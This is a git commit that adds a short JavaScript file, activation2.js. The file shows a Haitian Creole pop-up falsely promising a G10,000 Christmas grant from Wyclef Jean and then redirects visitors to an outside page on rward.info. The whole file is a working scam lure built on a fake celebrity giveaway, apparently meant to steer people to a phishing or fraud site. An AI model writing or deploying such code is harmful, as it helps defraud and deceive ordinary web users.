b9e2c744d763153b9a43a79eb91891afbbe6aa87
ita-giftt <tallaakoti@gmail.com>
2025-12-23 19:48:55 +0100

    Create activation2.js

---
+++ activation2.js
@@ -0,0 +1,5 @@
+var password = 'Soumèt Kounye a'
+password=prompt('Pòtal Sibvansyon: Felisitasyon, ou kalifye pou resevwa sibvansyon G10,000 pou selebrasyon Nwèl ki soti nan Wyclef Jean. Tanpri peze OK pou soumèt enfòmasyon ou epi resevwa G10,000 ou kounye a','Soumèt Kounye a'); 
+if (password != 'Soumèt Kounye a') {
+location.href='https://rward.info/Wyclef-Jean-G10000-Kado.html';
+}
